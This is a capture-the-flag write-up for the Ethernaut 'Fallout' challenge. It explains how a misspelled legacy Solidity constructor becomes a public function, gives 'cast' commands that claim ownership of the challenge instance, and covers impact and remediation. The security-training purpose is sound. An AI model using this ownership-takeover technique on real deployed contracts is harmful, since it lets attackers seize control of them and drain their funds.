# Ethernaut Challenge 02 — Fallout

## Goal

The challenge is solved when ownership of the contract is claimed.

**Instance:**

```text
0x8dFa68470948B77267fB5148e325cEe6184eAEd0
```

## Vulnerability

The contract is written using Solidity `0.6.0` and contains what appears to be a constructor:

```solidity
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

However, the contract is named:

```solidity
contract Fallout
```

while the function is named:

```solidity
Fal1out
```

The names do not match.

In Solidity versions prior to `0.7.0`, constructors were defined using a function with the same name as the contract. Because `Fal1out()` does not exactly match `Fallout`, it is treated as a normal `public` function rather than a constructor.

Therefore, any user can call it and execute:

```solidity
owner = msg.sender;
```

No existing ownership check or other authorization is required.

## Attack Path

```text
Fal1out()
    ↓
owner = msg.sender
    ↓
Attacker becomes owner
```

The function is also `payable`, but sending ETH is unnecessary. The ownership assignment occurs regardless of `msg.value`.

## Proof of Concept

The vulnerability was reproduced directly against the live instance using `cast`.

### 1. Check current owner

```bash
cast call 0x8dFa68470948B77267fB5148e325cEe6184eAEd0 \
    "owner()" \
    --rpc-url $RPC_URL
```

### 2. Call the unintended public function

```bash
cast send 0x8dFa68470948B77267fB5148e325cEe6184eAEd0 \
    "Fal1out()" \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL
```

No ETH is required.

### 3. Verify ownership takeover

```bash
cast call 0x8dFa68470948B77267fB5148e325cEe6184eAEd0 \
    "owner()" \
    --rpc-url $RPC_URL
```

The returned address should match the attacker's wallet.

## Impact

**Severity: Critical**

Any external account can call `Fal1out()` and overwrite the privileged `owner` variable.

This results in complete loss of ownership control and allows the attacker to invoke functions protected by:

```solidity
modifier onlyOwner()
```

In this contract, that includes:

```solidity
collectAllocations()
```

which transfers the contract's entire ETH balance to the caller.

## Remediation

For modern Solidity versions, use the built-in constructor syntax:

```solidity
constructor() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

When maintaining legacy Solidity code, ensure constructor names exactly match the contract name.

More importantly, review all externally callable functions that modify privileged state and verify that they cannot be invoked after deployment to bypass initialization or access-control assumptions.

## Audit Takeaway

**Never rely on constructor naming for security-critical initialization in legacy Solidity code without verifying how the compiler interprets it.**

A function that was intended to run only during deployment became a publicly callable ownership-transfer function.

This is a classic example of an **unprotected initialization / ownership takeover vulnerability**.
